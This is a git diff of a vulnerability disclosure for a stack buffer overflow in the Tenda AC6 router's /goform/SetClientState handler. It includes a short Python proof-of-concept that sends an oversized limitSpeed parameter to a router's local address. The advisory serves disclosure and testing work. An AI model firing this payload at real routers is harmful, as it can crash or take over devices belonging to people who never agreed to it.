@@ -10,7 +10,7 @@ A buffer overflow vulnerability has been identified in the Tenda AC6 15.03.06.50
 - **Vulnerability Type**: Stack-based Buffer Overflow
 
 ## Description:
-The vulnerable code path processes HTTP requests to the `/goform/SetSpeedWan`. When `speed_dir` is specified with excessive data, the buffer overflow occurs during string concatenation operations.
+A buffer overflow vulnerability exists in the HTTP request handler for the `/goform/SetClientState` endpoint. The vulnerability is triggered when processing requests containing the following parameters with excessive data lengths: `limitSpeed`/`deviceId`/`limitSpeedUp`.
 
 ![alt text](image-2.png)
 ## poc
@@ -26,9 +26,10 @@ import requests
 
 def send_payload(url, payload):
     print("sending...")
-    response = requests.get(url, params={'speed_dir': payload})
+    response = requests.get(url, params={'limitSpeed': payload, 'limitEn': "1"})
     print(f"Response status code: {response.status_code}\nResponse body: {response.text}")
 
-payload = 0xfa * b'A'
-send_payload("http://10.10.10.1/goform/SetSpeedWan", payload)
+payload = 0x200 * b'1'
+payload += b'DOIT' 
+send_payload("http://10.10.10.1/goform/SetClientState", payload)
 ```
